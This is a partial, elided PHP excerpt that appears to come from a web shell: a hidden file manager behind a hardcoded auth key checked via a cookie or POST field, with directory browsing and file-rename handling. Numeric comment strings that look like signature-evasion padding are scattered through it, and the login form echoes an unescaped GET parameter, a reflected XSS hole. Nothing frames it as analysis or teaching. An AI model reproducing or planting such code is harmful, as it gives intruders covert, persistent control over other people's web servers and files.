...
$auth_key = "453b25f8dd2d4132fc8eedf9507fe50a";
...
$pass = false;
if (isset($_COOKIE['pw_name_64226'])) {
    if(($_COOKIE['pw_name_64226']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_64226'])) {
        if(($_POST['pw_name_64226']) == $auth_key) {
            setcookie("pw_name_64226", $_POST['pw_name_64226']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_64226' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1726249858620281 1726249858210767 1726249858654856 1726249858297944
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1726249858620281 1726249858210767 1726249858654856 1726249858297944
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1726249858620281 1726249858210767 1726249858654856 1726249858297944
            $name = PATH . "/" . $_GET['r'];
